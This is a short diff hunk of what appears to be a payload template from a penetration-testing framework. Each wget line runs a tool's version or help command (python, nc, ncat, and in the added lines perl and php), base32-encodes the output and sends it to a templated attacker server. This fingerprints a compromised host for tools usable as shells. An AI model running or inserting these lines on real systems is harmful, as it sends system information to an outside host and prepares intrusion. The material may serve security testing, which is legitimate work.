@@ -9,3 +9,5 @@ wget "{{datastore.srvhost_url}}debug/tools/python2.7/?value=$(python2 --version 
 wget "{{datastore.srvhost_url}}debug/tools/python3/?value=$(python3 --version 2>&1 | base32 -w 0)" -O /dev/null
 wget "{{datastore.srvhost_url}}debug/tools/nc/?value=$(nc -h 2>&1 | base32 -w 0)" -O /dev/null
 wget "{{datastore.srvhost_url}}debug/tools/ncat/?value=$(ncat -h 2>&1 | base32 -w 0)" -O /dev/null
+wget "{{datastore.srvhost_url}}debug/tools/perl/?value=$(perl --version 2>&1 | base32 -w 0)" -O /dev/null
+wget "{{datastore.srvhost_url}}debug/tools/php/?value=$(php --version 2>&1 | base32 -w 0)" -O /dev/null
